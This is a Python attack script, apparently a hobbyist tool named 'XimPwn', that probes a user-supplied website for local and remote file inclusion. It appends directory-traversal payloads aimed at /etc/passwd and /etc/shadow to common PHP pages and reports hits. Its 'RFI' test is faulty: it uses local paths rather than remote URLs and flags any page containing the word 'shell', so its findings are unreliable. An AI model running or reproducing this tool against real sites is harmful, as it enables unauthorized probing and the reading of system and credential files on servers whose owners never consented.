import requests
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.panel import Panel
from urllib.parse import urlparse

console = Console()

lfi_payloads = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/shadow",
    "../../../../../../../../../../etc/group",
    "../../../../../../../../../../etc/hosts",
]

rfi_payloads = [
    "/shell.php",
    "/shell.txt",
    "/shell.jpg",
    "/shell.png",
]

def get_target_urls(url):
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    paths = [
        "/",
        "/index.php",
        "/index.html",
        "/login.php",
        "/admin.php",
        "/config.php",
        "/setup.php",
        "/install.php",
    ]
    return [f"{base_url}{path}" for path in paths]

def test_vulnerability(target_url, payloads, vuln_type):
    results = []
    for payload in payloads:
        try:
            test_url = f"{target_url}?file={payload}"
            r = requests.get(test_url, timeout=5)
            if vuln_type == "LFI":
                if any(keyword in r.text for keyword in ["root:", "shadow", "group"]):
                    results.append((target_url, payload, "Vulnerable"))
            elif vuln_type == "RFI":
                if "<?php" in r.text or "shell" in r.text.lower():
                    results.append((target_url, payload, "Vulnerable"))
        except Exception:
            pass
    return results

def print_banner():
    banner = r"""
███████╗██╗███╗   ███╗██████╗ ██╗    ██╗███╗   ██╗
╚══███╔╝██║████╗ ████║██╔══██╗██║    ██║████╗  ██║
  ███╔╝ ██║██╔████╔██║██████╔╝██║ █╗ ██║██╔██╗ ██║
 ███╔╝  ██║██║╚██╔╝██║██╔═══╝ ██║███╗██║██║╚██╗██║
███████╗██║██║ ╚═╝ ██║██║     ╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝╚═╝     ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
                                                  """
    info = (
        "[bold cyan]Author:[/bold cyan] Mohammad Zim\n"
        "[bold cyan]Youtube:[/bold cyan] https://www.youtube.com/@Study_Hard69\n"
        "[bold cyan]TryHackMe:[/bold cyan] https://tryhackme.com/p/MohammadZim\n"
        "[bold cyan]GitHub:[/bold cyan] https://github.com/Mr-Destroyer\n"
    )
    panel = Panel.fit(
        f"[bold magenta]{banner}[/bold magenta]\n"        "[bold yellow]XimPwn - Scan LFI - RFI vulnerabilities[/bold yellow]\n\n"
        f"{info}",
        title="[bold magenta]:zap: XimPwn Scanner :zap:[/bold magenta]",
        border_style="magenta",
        padding=(1, 2),
    )
    console.print(panel)

def main():
    print_banner()
    url = console.input("[bold yellow]Enter target URL:[/bold yellow] ")

    console.print(Panel.fit(f"[bold cyan]Starting attack on [green]{url}[/green]...[/bold cyan]", style="cyan"))

    target_urls = get_target_urls(url)
    all_results = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        transient=True,
    ) as progress:
        task = progress.add_task("[bold blue]Testing URLs...[/bold blue]", total=len(target_urls))
        for target_url in target_urls:
            console.print(f"[bold blue]🔍 Testing [white]{target_url}[/white]...[/bold blue]")
            lfi_results = test_vulnerability(target_url, lfi_payloads, "LFI")
            rfi_results = test_vulnerability(target_url, rfi_payloads, "RFI")
            all_results.extend(lfi_results)
            all_results.extend(rfi_results)
            progress.advance(task)

    if all_results:
        console.print(Panel.fit("[bold red]:rotating_light: Vulnerabilities found! :rotating_light:[/bold red]", style="red"))
        table = Table(title=":warning: Vulnerability Report :warning:", style="bold red")
        table.add_column("URL", style="cyan")
        table.add_column("Payload", style="yellow")
        table.add_column("Vulnerability Type", style="magenta")
        for result in all_results:
            table.add_row(result[0], result[1], "LFI" if "etc/" in result[1] else "RFI")
        console.print(table)
        console.print(Panel.fit(f"[bold red]Total Vulnerabilities: {len(all_results)}[/bold red]", style="red"))
    else:
        console.print(Panel.fit("[bold green]:white_check_mark: No vulnerabilities found. :white_check_mark:[/bold green]", style="green"))

if __name__ == "__main__":
    main()